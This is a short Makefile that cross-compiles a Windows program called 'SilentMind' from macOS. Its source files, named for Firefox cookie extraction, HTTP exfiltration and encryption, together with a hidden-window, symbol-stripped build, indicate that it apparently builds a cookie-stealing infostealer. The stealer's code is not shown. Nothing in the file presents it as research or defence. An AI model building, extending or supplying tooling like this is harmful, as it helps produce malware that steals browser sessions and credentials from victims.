# SilentMind Cross-Compilation Makefile for macOS to Windows
# Requires: mingw-w64 installed via Homebrew

# Compiler settings
CC = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -O2 -s -mwindows -I.
LIBS = -lwininet -lcrypt32 -ladvapi32 -lshell32

# Source files
SOURCES = client/main.c client/encrypt.c client/exfil_http.c client/firefox_cookies.c sqlite3.c
TARGET = silentmind.exe

# Default target
all: $(TARGET)

# Build the Windows executable
$(TARGET): $(SOURCES)
	@echo "Cross-compiling SilentMind for Windows..."
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCES) $(LIBS)
	@echo "Build complete: $(TARGET)"

# Clean build artifacts
clean:
	rm -f $(TARGET)
	@echo "Cleaned build artifacts"

# Install dependencies (macOS)
install-deps:
	@echo "Installing cross-compilation tools..."
	brew install mingw-w64
	@echo "Installing Python dependencies..."
	pip3 install -r requirements.txt

# Help
help:
	@echo "Available targets:"
	@echo "  all          - Build the Windows executable (default)"
	@echo "  clean        - Remove build artifacts"
	@echo "  install-deps - Install required dependencies"
	@echo "  help         - Show this help message"

.PHONY: all clean install-deps help
